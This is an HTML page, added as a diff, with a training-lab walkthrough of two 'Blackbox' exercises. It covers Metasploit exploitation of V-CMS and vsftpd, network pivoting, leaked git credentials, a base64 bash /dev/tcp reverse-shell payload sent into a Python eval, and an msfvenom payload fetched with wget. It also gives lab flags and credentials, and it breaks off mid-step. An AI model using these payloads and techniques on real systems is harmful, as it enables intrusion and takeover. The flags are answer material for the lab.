@@ -1,0 +1,1177 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Blackbox lab INE</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/css/lightgallery.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.css" rel="stylesheet">
+        <!-- Add Pygments CSS for code highlighting -->
+        <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.highlight .hll { background-color: #ffffcc }
+.highlight { background: #f8f8f8; }
+.highlight .c { color: #3D7B7B; font-style: italic } /* Comment */
+.highlight .err { border: 1px solid #FF0000 } /* Error */
+.highlight .k { color: #008000; font-weight: bold } /* Keyword */
+.highlight .o { color: #666666 } /* Operator */
+.highlight .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.highlight .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #9C6500 } /* Comment.Preproc */
+.highlight .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.highlight .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #A00000 } /* Generic.Deleted */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #E40000 } /* Generic.Error */
+.highlight .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.highlight .gi { color: #008400 } /* Generic.Inserted */
+.highlight .go { color: #717171 } /* Generic.Output */
+.highlight .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.highlight .gt { color: #0044DD } /* Generic.Traceback */
+.highlight .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.highlight .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.highlight .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.highlight .kp { color: #008000 } /* Keyword.Pseudo */
+.highlight .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #B00040 } /* Keyword.Type */
+.highlight .m { color: #666666 } /* Literal.Number */
+.highlight .s { color: #BA2121 } /* Literal.String */
+.highlight .na { color: #687822 } /* Name.Attribute */
+.highlight .nb { color: #008000 } /* Name.Builtin */
+.highlight .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+.highlight .no { color: #880000 } /* Name.Constant */
+.highlight .nd { color: #AA22FF } /* Name.Decorator */
+.highlight .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.highlight .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #0000FF } /* Name.Function */
+.highlight .nl { color: #767600 } /* Name.Label */
+.highlight .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+.highlight .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.highlight .nv { color: #19177C } /* Name.Variable */
+.highlight .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mb { color: #666666 } /* Literal.Number.Bin */
+.highlight .mf { color: #666666 } /* Literal.Number.Float */
+.highlight .mh { color: #666666 } /* Literal.Number.Hex */
+.highlight .mi { color: #666666 } /* Literal.Number.Integer */
+.highlight .mo { color: #666666 } /* Literal.Number.Oct */
+.highlight .sa { color: #BA2121 } /* Literal.String.Affix */
+.highlight .sb { color: #BA2121 } /* Literal.String.Backtick */
+.highlight .sc { color: #BA2121 } /* Literal.String.Char */
+.highlight .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.highlight .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.highlight .s2 { color: #BA2121 } /* Literal.String.Double */
+.highlight .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.highlight .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.highlight .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.highlight .sx { color: #008000 } /* Literal.String.Other */
+.highlight .sr { color: #A45A77 } /* Literal.String.Regex */
+.highlight .s1 { color: #BA2121 } /* Literal.String.Single */
+.highlight .ss { color: #19177C } /* Literal.String.Symbol */
+.highlight .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #0000FF } /* Name.Function.Magic */
+.highlight .vc { color: #19177C } /* Name.Variable.Class */
+.highlight .vg { color: #19177C } /* Name.Variable.Global */
+.highlight .vi { color: #19177C } /* Name.Variable.Instance */
+.highlight .vm { color: #19177C } /* Name.Variable.Magic */
+.highlight .il { color: #666666 } /* Literal.Number.Integer.Long */</style>
+        <style>
+            /* Center the HTML file on the screen */
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                padding-top: 30px;
+            }
+            /* Make the display width of the HTML file smaller */
+            .container {
+                max-width: 42vw;
+                margin: 0 auto;
+                height: 100%
+            }
+            
+            img {
+                width: 80%;
+            }
+        </style>
+        <script src="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/js/lightgallery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-zoom.js/dist/lg-zoom.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js/dist/lg-fullscreen.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-share.js/dist/lg-share.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js/dist/lg-autoplay.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-rotate.js/dist/lg-rotate.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-flip.js/dist/lg-flip.min.js"></script>
+        <script>
+            window.onload = function() {
+                const images = document.getElementsByTagName('img');
+                const lightGalleryItems = [];
+                for (let i = 0; i < images.length; i++) {
+                    const img = images[i];
+                    if (img.naturalWidth > 1000) {
+                        if (window.innerWidth > 768) {
+                            img.style.width = '110%';
+                            img.style.transform = 'translateX(-4%)';
+                        } else {
+                            img.style.width = '100%';
+                            img.style.transform = 'none';
+                        }
+                    }
+                    lightGalleryItems.push({ src: img.src, thumb: img.src });
+                    img.setAttribute('data-lg-idx', i);
+                    img.addEventListener('click', function() {
+                        lightGallery(img, {
+                            dynamic: true,
+                            dynamicEl: lightGalleryItems,
+                            index: parseInt(img.getAttribute('data-lg-idx'))
+                        });
+                    });
+                }
+            };
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <h1 style="text-align:center; text-transform:uppercase; font-family: 'Playfair Display', serif; font-weight:700;"">BLACKBOX 1</h1>
+
+<p>Step 1: Open the lab link to access the Kali GUI instance.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_1.png" /></p>
+<p>Step 2: Check if the provided machine/domain is reachable.</p>
+<p>Command</p>
+<p>ping demo.ine.local</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_2.png" /></p>
+<p>The provided machine is reachable, and we also found the target IP Address.</p>
+<p>Step 3: Check open ports on the provided machine.</p>
+<p>Command</p>
+<p>nmap demo.ine.local</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_3.png" /></p>
+<p>On the provided machine, ports 80 (HTTP), 3306 (MySQL) are open.</p>
+<p>We will target port 80 to find the running application name and version to proceed further.</p>
+<p>Step 4: Check the interfaces present on the Kali machine.</p>
+<p>Command</p>
+<p>ifconfig</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_4.png" /></p>
+<p>There are two interfaces (excluding loopback interface) present on the machine i.e. eth0 and eth1.</p>
+<p>In this case we are interested in eth1 interface IP Address range: 192.62.135.0/24</p>
+<p>Note: The IP address will be different in your case, so make sure you use the correct IP address, otherwise the commands might not give the expected results!</p>
+<p>Step 5: Running the nmap on port 80 to find all possible information about the target server.</p>
+<p>Command</p>
+<p>nmap -A -O -p 80 demo.ine.local</p>
+<p>-A: Enable OS detection, version detection, script scanning, and traceroute</p>
+<p>-O: Enable OS detection</p>
+<p>-p: Port</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_5.png" /></p>
+<p>Machine is running nginx 1.14.0 server on port 80 and V-CMS application is hosted on it.</p>
+<p>Step 6: To know the version of V-CMS application, open Firefox browser and access the V-CMS app.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_6.png" /></p>
+<p>URL</p>
+<p><a href="http://demo.ine.local">http://demo.ine.local</a></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_7.png" /></p>
+<p>The version 1.0 is mentioned in the footer.</p>
+<p>Step 7: Search for publicly available exploit for this version of V-CMS.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_8.png" /></p>
+<p>We can observe that V-CMS v1.0 is vulnerable to PHP file upload and execution. Also, there is a metasploit module to exploit it.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_9.png" /></p>
+<p>We can use this module for exploitation.</p>
+<p>Step 8: Start the Metasploit framework and search for the vcms module. Then, check all the vcms module available options.</p>
+<p>Command</p>
+<p>msfconsole -q</p>
+<p>search vcms</p>
+<p>use exploit/linux/http/vcms_upload</p>
+<p>show options</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_10.png" /></p>
+<p>We have found the vcms exploit module.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_11.png" /></p>
+<p>We can notice, that "TARGETURI" is set to /vcms/ path. We need to change that value to "/" because the v-cms application is present in the base address.</p>
+<p>Set "RHOSTS" (or Remote Hosts) to demo.ine.local where the port 80 is exposed</p>
+<p>Port 80 is by-default mentioned in the module, also php/meterpreter/reverse_tcp payload is set along with "LHOST" and "LPORT" (Local Machine IP Address and Port) for reverse connection of the meterpreter shell.</p>
+<p>The LHOST IP Address which is by default mentioned is not valid. (10.1.0.3). We must replace it to appropriate address, "192.62.135.2" in this setup</p>
+<p>Step 9: Set the target information and exploit the vcms application</p>
+<p>Command</p>
+<p>set RHOSTS demo.ine.local</p>
+<p>set TARGETURI /</p>
+<p>set LHOST 192.62.135.2</p>
+<p>check</p>
+<p>exploit</p>
+<p>getuid</p>
+<p>Note: The "check" command quickly verify that all the module settings and target is valid to exploit or not.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_12.png" /></p>
+<p>We have successfully exploited the v-cms using Metasploit framework and received a meterpreter session with the root privileges.</p>
+<p>Step 10: Retrieve the first flag.</p>
+<p>Command</p>
+<p>ls /root</p>
+<p>cat /root/flag.txt</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_13.png" /></p>
+<p>FLAG</p>
+<p>4f96a3e848d233d5af337c440e50fe3d</p>
+<p>We have successfully exploited the first machine and retrieved the first flag.</p>
+<p>Step 11: Check all the available interfaces on the compromised machine</p>
+<p>Command</p>
+<p>shell</p>
+<p>ifconfig</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_14.png" /></p>
+<p>Again, there are two interfaces (excluding loopback interface) present on the machine i.e. eth0 and eth1.</p>
+<p>Ping the eth1 IP address from the Kali machine i.e 192.69.228.2</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_15.png" /></p>
+<p>We can't access IP range 192.69.228.0/24 from the Kali machine. To access this network from Kali, we need perform pivoting.</p>
+<p>Step 12: Use "autoroute" command to add route to unreachable IP range.</p>
+<p>autoroute</p>
+<p>This command is used to add meterpreter session specific routes to the Metasploit's routing table. These routes can be used to pivot to the otherwise unreachanble network.</p>
+<p>Check help option for "autoroute" command.</p>
+<p>Command</p>
+<p>run autoroute -h</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_16.png" /></p>
+<p>Add the route to IP range 192.69.228.0/24</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_17.png" /></p>
+<p>Command</p>
+<p>run autoroute -s 192.69.228.0 -n 255.255.255.0</p>
+<p>Background the meterpreter session and check if the route is added successfully to the metasploit's routing table.</p>
+<p>Command</p>
+<p>background</p>
+<p>route print</p>
+<p>The route is added successfully. We could use the "route" command to add the routing table to the metasploit framework</p>
+<p>Command</p>
+<p>route add 192.69.228.0 255.255.255.0 1</p>
+<p>Syntax:routeadd(make a new route)subnetnetmasksid(meterpreter session ID)</p>
+<p>Step 13: We will run auxiliary TCP port scanning module to discover any available hosts (From IP .3 to .10). And, if any of ports 80, 8080, 445, 21 and 22 are open on those hosts.</p>
+<p>Command</p>
+<p>use auxiliary/scanner/portscan/tcp</p>
+<p>set PORTS 80, 8080, 445, 21, 22</p>
+<p>set RHOSTS 192.69.228.3-10</p>
+<p>exploit</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_18.png" /></p>
+<p>We have discovered one host i.e. 192.69.228.3. Ports 21 (FTP) and 22 (SSH) are open on this host.</p>
+<p>Step 14: In the meterpreter session there is an utility "portfwd" which allows forwarding remote machine port to the local machine port. We want to target port 21 of that machine so we will forward remote port 21 to the local port 1234.</p>
+<p>Interact with the meterpreter session and forward the remote port to local machine.</p>
+<p>Check portfwd meterpreter command help option.</p>
+<p>Command</p>
+<p>session -i 1</p>
+<p>portfwd -h</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_19.png" /></p>
+<p>Forwarding the remote port to local port</p>
+<p>Command</p>
+<p>portfwd add -l 1234 -p 21 -r 192.69.228.3</p>
+<p>portfwd list</p>
+<p>-lLocal port</p>
+<p>-pRemote port</p>
+<p>-rRemote host</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_20.png" /></p>
+<p>We have successfully forwarded the port. Now, scan the local port using Nmap.</p>
+<p>Step 15: Running nmap on the forwarded local port to identify the service name.</p>
+<p>Command</p>
+<p>background</p>
+<p>nmap -sS -sV -p 1234 localhost</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_21.png" /></p>
+<p>We can observe from the results that host is running vsftpd (FTP) service.</p>
+<p>Note: Sometimes scan can take a little bit longer than expected. Please be patient.</p>
+<p>Step 16: Search for vsftpd exploit module</p>
+<p>Command</p>
+<p>search vsftpd</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_22.png" /></p>
+<p>There is an exploit for vsftpd service in the Metasploit framework.</p>
+<p>Step 17: Exploit the target host using vsftpd backdoor exploit module.</p>
+<p>Command</p>
+<p>use exploit/unix/ftp/vsftpd_234_backdoor</p>
+<p>set RHOSTS 192.69.228.3</p>
+<p>exploit</p>
+<p>id</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_23.png" /></p>
+<p>Note: Sometimes, the exploit fails the first time. If that happens then please run the exploit again.</p>
+<p>Command</p>
+<p>exploit</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_24.png" /></p>
+<p>Once the exploit is completed, we will get a session on host and can run commands on it.</p>
+<p>Step 18: Retrieve the second flag.</p>
+<p>Command</p>
+<p>ls /root</p>
+<p>cat /root/flag.txt</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_25.png" /></p>
+<p>FLAG</p>
+<p>58c7c29a8ab5e7c4c06256b954947f9a</p>
+<p>We have exploited both machines and also recovered both flags!</p>
+<p>BLACKBOX 2</p>
+<p>Lab Environment</p>
+<p>In this lab environment, the user is going to get access to a Kali GUI instance. A web server can be accessed using the tools installed on Kali on . However, there is another machine in the setup which is not accessible from the Kali machine but is accessible from the web server.</p>
+<p>Objective: Compromise both machines to retrieve the flags!</p>
+<p>Tools</p>
+<p>The best tools for this lab are:</p>
+<pre><code>   -  dirb
+   -  Metasploit Framework
+   -  Proxychains
+   -  A Web Browser
+</code></pre>
+<p>Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course, will dramatically reduce the benefits of a hands-on lab!</p>
+<p>Solution</p>
+<p>Step 1: Open the lab link to access the Kali GUI instance.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_26.png" /></p>
+<p>Step 2: Check if the provided machine/domain is reachable.</p>
+<p>Command:</p>
+<p>ping -c5 online-calc.com</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_27.png" /></p>
+<p>The provided machine is reachable.</p>
+<p>Step 3: Check open ports on the provided machine.</p>
+<p>Command</p>
+<p>nmap -sS -sV online-calc.com</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_28.png" /><img alt="" src="../media/Blackbox%20lab%20INE_29.png" /></p>
+<p>On the provided machine, ports 80, 5000 and 8000 are open.</p>
+<pre><code>   -  Apache web server is available on port 80.
+   -  A Python-based web server is available on port 8000.
+   -  The service available on port 5000 is not recognized by Nmap. And that's you can see the long string at the bottom of the port scan output. It's the fingerprint for that service. If you notice the output closely, it's the HTTP response returned by that service and it contains HTML content. So it must be some kind of webapp.
+</code></pre>
+<p>Open the browser and check the responses returned by these above 3 discovered services:</p>
+<p>Port 80:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_30.png" /></p>
+<p>As expected, Apache is available on this port.</p>
+<p>Port 5000:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_31.png" /></p>
+<p>A calc webapp is available on this port.</p>
+<p>Port 8000:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_32.png" /></p>
+<p>On this port a Python-based HTTP service was available. The response is in JSON format. So this could be some kind of API.</p>
+<p>Step 4: Performing directory enumeration on the exposed services using dirb tool.</p>
+<p>Port 80:</p>
+<p>Command</p>
+<p>dirb http://online-calc.com</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_33.png" /></p>
+<p>There's nothing interesting in the above output.</p>
+<p>Port 5000:</p>
+<p>Command</p>
+<p>dirb http://online-calc.com:5000</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_34.png" /></p>
+<p>There's nothing interesting in the above output.</p>
+<p>Port 8000:</p>
+<p>Command</p>
+<p>dirb http://online-calc.com:8000</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_35.png" /></p>
+<p>The above output does contain some interesting information. Notice that there are 2 exposed resources which look quite interesting from the perspective of a pentester:</p>
+<pre><code>   -  /.git/: Probably there are some more files in the exposed .git directory
+   -  /console: This could give access to werkzeug's debugger console and give us an easy RCE!
+</code></pre>
+<p>Let's try to access/consoleand see if it provides unauthenticated access or not:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_36.png" /></p>
+<p>As you can see the console is locked and requires a PIN. Since the PIN is not known, and brute forcing it is not feasible, since Werkzeug only allows a few attempts after which !</p>
+<p>Let's use dirb to explore files in the exposed/.gitfolder:</p>
+<p>Command:</p>
+<p>dirb http://online-calc.com/.git</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_37.png" /></p>
+<p>Notice thatconfigandindexfiles are also exposed!</p>
+<p>Step 5: Retrieving git config from the target machine.</p>
+<p>Let's retrieve the git config and see if there's anything interesting in there:</p>
+<p>Command:</p>
+<p>curl http://online-calc.com:8000/.git/config</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_38.png" /><img alt="" src="../media/Blackbox%20lab%20INE_39.png" /></p>
+<p>Notice that the git config contains details including the credentials of a user named Jeremy McCarthy:</p>
+<p>Email: jeremy@dummycorp.com Username: jeremy Password: diamonds</p>
+<p>The git config file also contains the URL of the remote origin:</p>
+<p>Remote Origin URL:</p>
+<p>Step 6: Cloning the remote repository.</p>
+<p>Use the following command to clone the remote repository:</p>
+<p>Command:</p>
+<p>git clone http://online-calc.com/projects/online-calc</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_40.png" /></p>
+<p>Command:</p>
+<p>ls</p>
+<p>Notice that the git repository has been cloned successfully!</p>
+<p>Checking the files present in the cloned repository:</p>
+<p>Command:</p>
+<p>cd online-calc/</p>
+<p>ls</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_41.png" /></p>
+<p>There are 2 files present in the cloned repository: - API.py - utils.py</p>
+<p>Looks like this is the repository containing the code running on port 8000. This fact would be apparent as we make progress with our investigation of the repository in the following steps.</p>
+<p>Step 7: Checking the git logs.</p>
+<p>Let's check the git logs to get some more context on the cloned repository and see if anything interesting can be located in the commit history:</p>
+<p>Command:</p>
+<p>git log</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_42.png" /></p>
+<p>Notice that the commit logs did contain some interesting information. Seems like there were 2 pressing issues with the code in this repository: - Arbitrary File Read - Remote Code Execution (RCE)</p>
+<p>Both of the issues seem to be fixed in the subsequent commits.</p>
+<p>Step 8: Checking the code changes made to fix the arbitrary file read vulnerability.</p>
+<p>Use the following command to list the changes between the commit when the arbitrary file read vulnerability was fixed and the commit just before it:</p>
+<p>Command:</p>
+<p>git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_43.png" /></p>
+<p>Notice thatsend_from_directoryfunction is used to send any file requested from the root directory of the Flask server and if the requested path contains..or%2E, a404response is returned!</p>
+<p>Step 9: Checking the code changes made to fix the RCE vulnerability.</p>
+<p>Use the following command to list the changes between the commit when the RCE vulnerability was fixed and the commit just before it:</p>
+<p>Command:</p>
+<p>git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_44.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_45.png" /></p>
+<p>Notice that in order to fix the bug, a function namedisValidwas added to the code and in theevaluatefunction, theisValidfunction is called before the user-supplied data is passed to theevalfunction.</p>
+<p>Also notice that the/character in the user input is being replaced by* 1.0 /in theevaluatefunction.</p>
+<p>Step 10: Modify the code in the API.py and make it vulnerable to RCE again.</p>
+<p>Open the API.py file in a text editor of your choice. We are using vim:</p>
+<p>Command:</p>
+<p>vim API.py</p>
+<p>Now comment the input validation check before the call toeval:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_46.png" /></p>
+<p>Now commit these changes to the repository:</p>
+<p>Commands:</p>
+<p>git status</p>
+<p>git add .</p>
+<p>git commit -m "Bug Fix" --author "Jeremy McCarthy <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#106;&#101;&#114;&#101;&#109;&#121;&#64;&#100;&#117;&#109;&#109;&#121;&#99;&#111;&#114;&#112;&#46;&#99;&#111;&#109;">&#106;&#101;&#114;&#101;&#109;&#121;&#64;&#100;&#117;&#109;&#109;&#121;&#99;&#111;&#114;&#112;&#46;&#99;&#111;&#109;</a>"</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_47.png" /></p>
+<p>The above commands would commit the changes to the repository with the author name and email set to that of Jeremy McCarthy's.</p>
+<p>Now let's push these changes to the remote repository:</p>
+<p>Command:</p>
+<p>git push</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_48.png" /></p>
+<p>Upon running the above command, you would be asked for the credentials before making changes to the remote repository. If you remember, the git config we retrieved previously (in Step 5) had the credentials for the user named Jeremy McCarthy. Those credentials would work and the code should be pushed to the remote repository after successful authentication!</p>
+<p>If you notice the output to the push command, you would see some commands being executed. Looks like the code is being updated in the webapp in real-time. That can be confirmed by pulling API.py from the Flask server:</p>
+<p>Command:</p>
+<p>curl http://online-calc.com:8000/API.py</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_49.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_50.png" /></p>
+<p>Notice that the call toisValidfunction has been commented out. So the changes we pushed have been applied to the webapp in real-time, as we speculated!</p>
+<p>Step 11: Preparing the exploit to get a reverse shell session on the target machine.</p>
+<p>Checking the IP address of the provided Kali instance:</p>
+<p>Command:</p>
+<p>ip addr</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_51.png" /></p>
+<p>Notice that there are 2 interfaces (excluding the loopback interface) on the provided Kali instance namely: eth0 and eth1.</p>
+<p>The target machine () is on the same network as that of eth1. So we will use the IP of that interface in this exploit:192.196.85.2</p>
+<p>Since the/characters in the user payload would be converted to* 1.0 /by theevaluatefunction, we will base64-encode the payload:</p>
+<p>Command:</p>
+<p>echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.196.85.2/4444 0&gt;&amp;1"' | base64</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_52.png" /></p>
+<p>Note: Make sure you replace the IP in the above command with the IP of your Kali GUI instance. Otherwise the exploit wouldn't work!</p>
+<p>Step 12: Exploiting the RCE to get a reverse shell.</p>
+<p>Once the payload has been base64-encoded, start a netcat listener on one of the terminals of the provided Kali instance:</p>
+<p>Command:</p>
+<p>nc -lvp 4444</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_53.png" /></p>
+<p>Copy the following payload:</p>
+<p>Payload:</p>
+<p><strong>import</strong>("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTk2Ljg1LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_54.png" /></p>
+<p>Note: - Press CTRL+SHIFT+ALT in order to copy the payload to the clipboard of the Kali instance. - Make sure to replace the base64-encoded value in the above payload since the IP address of your Kali GUI instance might be different. If you copy the payload as is, chances are that it might not work due to the same reason.</p>
+<p>The above payload decodes the base64 encoded payload we created in the previous step and passes it tobashfor executing the reverse shell payload. Since our payload will be executed by theevalfunction in Python, that's why we are importing Python'sosmodule to execute the desired commands.</p>
+<p>Now paste the copied payload to the textbox in the calculator webapp and press the=button to supply the payload to the backend:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_55.png" /></p>
+<p>This should trigger the bug and get us the reverse shell! Once the payload has been supplied, check the terminal on which the netcat listener was started:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_56.png" /></p>
+<p>We've got a reverse shell session from the target machine!</p>
+<p>Looks like we've got a root shell:</p>
+<p>Command:</p>
+<p>id</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_57.png" /></p>
+<p>Step 13: Retrieving the flag from the target machine.</p>
+<p>Let's find the flag from this machine:</p>
+<p>Command:</p>
+<p>find / -iname <em>flag</em> 2&gt;/dev/null</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_58.png" /></p>
+<p>Notice the very first entry of the output:/tmp/flag. This file contains the flag.</p>
+<p>Let's read the flag:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_59.png" /></p>
+<p>Flag: 3b2b474c06380f696b38c1498f795e054374</p>
+<p>Step 14: Generating payload to gain a meterpreter session on the compromised machine.</p>
+<p>Even though we have compromised the target machine, we are still limited in the things we can do with the normal shell session. It would be quite good to gain a meterpreter shell session instead to carry out further exploitation.</p>
+<p>Use the following command to generate areverse_tcppayload to get back a meterpreter shell session (an ELF binary):</p>
+<p>Command:</p>
+<p>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.196.85.2 LPORT=5555 -f elf &gt; payload.bin</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_60.png" /></p>
+<p>The payload is now ready and saved to the file namedpayload.bin.</p>
+<p>Command:</p>
+<p>file payload.bin</p>
+<p>It's an 64-bit ELF binary, as indicated by the above command!</p>
+<p>Step 15: Downloading the payload binary on the compromised target machine.</p>
+<p>We will start a Python-based file server on the Kali instance and serve the generated payload binary:</p>
+<p>Command:</p>
+<p>python3 -m http.server 80</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_61.png" /></p>
+<p>Now we can download the payload binary on the compromised target machine usingwgetutility on the reverse shell session we had gained in Step 12.</p>
+<p>Commands:</p>
+<p>wget http://192.196.85.2/payload.bin</p>
+<p>file payload.bin</p>
+<p>chmod +x payload.bin</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_62.png" /></p>
+<p>The above commands download the payload binary from the Kali instance, check the file type (just confirming if the file is properly downloaded or got corrupted) and make it executable.</p>
+<p>Note: If you check the Python-based file server, you can notice the request to download the payload file here as well:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_63.png" /></p>
+<p>This can become handy in case of blind exploitation scenarios where we can execute commands but cannot see the output.</p>
+<p>Step 16: Gaining a meterpreter session on the target machine.</p>
+<p>So by now everything is ready on the target machine. Now all we need to do is set up a multi handler on the Kali instance and gain the meterpreter session by executing the payload on the target machine.</p>
+<p>Use the following commands to setup a multi handler on the Kali instance:</p>
+<p>Commands:</p>
+<p>msfconsole -q</p>
+<p>use exploit/multi/handler</p>
+<p>set PAYLOAD linux/x64/meterpreter/reverse_tcp</p>
+<p>set LHOST 192.196.85.2</p>
+<p>set LPORT 5555</p>
+<p>run</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_64.png" /></p>
+<p>The above set of commands would have started the metasploit framework and configured the options forexploit/multi/handlermodule: - The payload is set tolinux/x64/meterpreter/reverse_tcp(we generated this payload using msfvenom) - LHOST and LPORT are set to the same values we used for generating the payload via msfvenom.</p>
+<p>Now the reverse TCP handler is running on the Kali instance, we can execute the payload binary on the compromised target machine:</p>
+<p>Command:</p>
+<p>./payload.bin</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_65.png" /></p>
+<p>Check the terminal in which the reverse TCP handler was running:</p>
